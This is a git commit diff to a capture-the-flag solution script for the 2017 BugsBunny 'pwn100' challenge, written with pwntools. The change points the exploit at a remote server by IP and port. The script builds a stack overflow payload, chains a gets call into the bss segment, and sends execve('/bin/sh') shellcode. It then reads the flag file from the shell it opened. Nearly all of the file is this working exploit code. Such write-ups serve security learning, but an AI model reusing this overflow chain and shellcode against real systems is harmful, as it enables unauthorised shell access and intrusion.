edbedc20775af218127530f8f8123cb345d07083
hackability <ktb88@korea.ac.kr>
2017-08-02 00:50:13 -0700

    [mod] pwn/sol_pwn100.py

--- pwnable/0013_2017_bugsbunny_pwn100/sol_pwn100.py
+++ pwnable/0013_2017_bugsbunny_pwn100/sol_pwn100.py
@@ -1,12 +1,12 @@
 from pwn import *
+server = "54.67.102.66"
+port = 5252
 
-target = "./pwn100"
+p = remote(server, port)
 
-p = process(target)
-
-bss = 0x0804a001
+bss      = 0x0804a001
 plt_gets = 0x080482f0
-pr = 0x080484af
+pr       = 0x080484af
 
 payload = "A" * 0x18
 payload += "A" * 4
@@ -20,5 +20,7 @@ p.sendline(payload)
 payload = "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
 p.sendline(payload)
-
-p.interactive()
+time.sleep(1)
+p.sendline("cat /home/pwn100/flag")
+time.sleep(1)
+print p.recv()
